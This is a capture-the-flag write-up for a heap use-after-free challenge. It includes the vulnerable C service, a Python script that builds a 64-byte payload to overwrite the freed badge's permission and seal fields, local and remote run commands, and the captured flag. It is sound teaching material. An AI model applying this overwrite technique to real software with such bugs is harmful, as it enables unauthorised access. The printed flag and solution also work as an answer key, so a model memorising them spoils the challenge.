## 1. Challenge Overview

We are given a statically linked x86-64 ELF binary `service`, its source `service.c`, a client script `client.py`, and some transport notes.  
The binary accepts up to 64 bytes on stdin and checks two fields in a freed heap chunk. If the values match, it calls `reward()` and prints the flag.

The key bug is a **use-after-free** combined with **heap reuse**: a freed `badge` pointer is still used for authorization, and the next allocation reused that memory in the recorded challenge run. We can overwrite the recycled memory to satisfy the check.

---

## 2. Source Code Analysis

`service.c`:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void reward(void) {
    char b[160] = {0};
    const char *p = getenv("FLAG_PATH");
    FILE *f = fopen(p ? p : "/run/secrets/flag", "r");
    if (f) { fgets(b, sizeof(b), f); fclose(f); puts(b); }
}

void setup(void) {
    alarm(2); setbuf(stdout, NULL); setbuf(stdin, NULL);
}

typedef struct {
    uint64_t permission;
    uint64_t seal;
    char name[48];
} badge;

int main(void) {
    setup();
    badge *old = malloc(sizeof(badge));
    old->permission = 0;
    old->seal = 0;
    strcpy(old->name, "visitor");
    free(old);

    char *replacement = malloc(sizeof(badge));
    puts("64 bytes for the replacement badge:");
    if (read(0, replacement, sizeof(badge)) < 16) return 0;

    if (old->permission == 0x5354414646ULL && old->seal == 0x5449424542ULL)
        reward();
    else
        puts("Visitor badge.");
}
```

### Struct layout

```c
typedef struct {
    uint64_t permission;  // offset 0, 8 bytes
    uint64_t seal;        // offset 8, 8 bytes
    char name[48];        // offset 16, 48 bytes
} badge;                  // total = 64 bytes
```

No padding — exactly 64 bytes.

### Program flow

1. `old = malloc(sizeof(badge));` → allocates 64-byte chunk.
2. Initializes `old->permission = 0`, `old->seal = 0`, `name = "visitor"`.
3. `free(old);` → releases the allocation while leaving `old` dangling.
4. `replacement = malloc(sizeof(badge));` → reused the released chunk in this challenge’s allocation sequence.
5. Reads up to 64 bytes into `replacement`.
6. Checks `old->permission` and `old->seal`.
   - Because `old` still points to the freed chunk, and `replacement` now occupies that chunk, writing to `replacement` overwrites the fields that `old` checks.
7. If the check passes, `reward()` prints the flag.

---

## 3. Vulnerability

**Use-after-free + heap reuse.**  
The program frees `old`, then allocates `replacement` of the same size. In the recorded environment, the replacement allocation reused the released storage. Reuse depends on the allocator, build and allocation sequence; it is not guaranteed by C. Reading fields through the dangling `old` pointer is undefined behavior.

We control the bytes written into `replacement`, so we control `old->permission` and `old->seal`.

### Required values

```c
old->permission == 0x5354414646ULL
old->seal       == 0x5449424542ULL
```

Notice these are ASCII strings interpreted as integers:

- `0x5354414646` = `"STAFF"` (big-endian bytes: `53 54 41 46 46`)
- `0x5449424542` = `"TIBEB"` (big-endian bytes: `54 49 42 45 42`)

But x86-64 is **little-endian**, so we must pack them as little-endian 64-bit integers.  
If we just wrote the ASCII bytes `"STAFF"` and `"TIBEB"`, the integer comparison would fail because the byte order would be reversed.

---

## 4. Exploit Payload Construction

We need exactly 64 bytes:

- Bytes 0–7: `permission` as little-endian `uint64_t` → `0x5354414646`
- Bytes 8–15: `seal` as little-endian `uint64_t` → `0x5449424542`
- Bytes 16–63: 48 bytes of filler (e.g., `'A'`)

Python script:

```python
import struct

payload  = struct.pack('<Q', 0x5354414646)  # permission
payload += struct.pack('<Q', 0x5449424542)  # seal
payload += b'A' * 48                        # name filler

open('payload.bin', 'wb').write(payload)
print('payload size:', len(payload))
print('payload hex :', payload.hex())
```

This produces:

```
4646415453000000 4245424954000000 414141... (48 A's)
```

---

## 5. Local Testing

Before hitting the remote, test locally. The binary reads `FLAG_PATH` from the environment.

```bash
chmod +x service
echo 'tibeb{local_test_flag}' > /tmp/testflag
FLAG_PATH=/tmp/testflag ./service < payload.bin
```

Expected output:

```
64 bytes for the replacement badge:
tibeb{local_test_flag}
```

If you see that, the exploit works.

---

## 6. Remote Exploitation

The provided `client.py` sends a binary payload via HTTP POST to `/run`.

```bash
python3 client.py https://challenges.tibeb.org/70985809-2e87-4c6d-b572-f1c97271c677 < payload.bin
```

Output:

```
64 bytes for the replacement badge:
tibeb{borrowed_badge_58d87fd6a05220b3d6d2}
```

---

## 7. Flag

```
tibeb{borrowed_badge_58d87fd6a05220b3d6d2}
```

---

## 8. Tricky Details & Notes

- **Endianness matters.** The constants `0x5354414646` and `0x5449424542` are ASCII `"STAFF"` and `"TIBEB"` in big-endian. On x86-64 you must write them as little-endian 64-bit values. Using `struct.pack('<Q', ...)` handles this correctly.
- **Struct size is exactly 64 bytes.** No hidden padding. `uint64_t` + `uint64_t` + `char[48]` = 64.
- **Heap reuse was observed in this exercise.** The immediate same-size allocation was sufficient in the recorded environment. Other allocators or builds can behave differently.
- **`read()` may return fewer bytes.** The program rejects reads shorter than 16 bytes. The two checked fields occupy those first 16 bytes; the supplied payload includes 48 additional filler bytes.
- **`reward()` reads `FLAG_PATH`.** Locally you can set it to any file. Remotely the challenge sets it to the real flag path (likely `/run/secrets/flag`).
- **No PIE, static, NX, no canary** — but we don't need ROP or shellcode. This is a pure data-overwrite challenge.
- **Execution limit is 3 seconds**, and `alarm(2)` is set in `setup()`. The exploit is instantaneous, so no issue.
- **Client script** sends the payload as raw binary with `Content-Type: application/octet-stream`. It posts to `<url>/run`. If you have IPv6 issues, use `--ipv4`.

---

## 9. Quick Command Summary

```bash
# 1. Download files (already done)
mkdir -p ~/ctf/borrowed_badge && cd ~/ctf/borrowed_badge
BASE='https://challenges.tibeb.org/70985809-2e87-4c6d-b572-f1c97271c677/downloads'
for f in service service.c client.py transport.txt bundle.zip; do
  curl -fLO "$BASE/$f"
done

# 2. Create payload
python3 - <<'PY'
import struct
payload  = struct.pack('<Q', 0x5354414646)
payload += struct.pack('<Q', 0x5449424542)
payload += b'A' * 48
open('payload.bin', 'wb').write(payload)
PY

# 3. Local test
chmod +x service
echo 'tibeb{local_test_flag}' > /tmp/testflag
FLAG_PATH=/tmp/testflag ./service < payload.bin

# 4. Remote exploit
python3 client.py https://challenges.tibeb.org/70985809-2e87-4c6d-b572-f1c97271c677 < payload.bin
```

That’s the full solution.
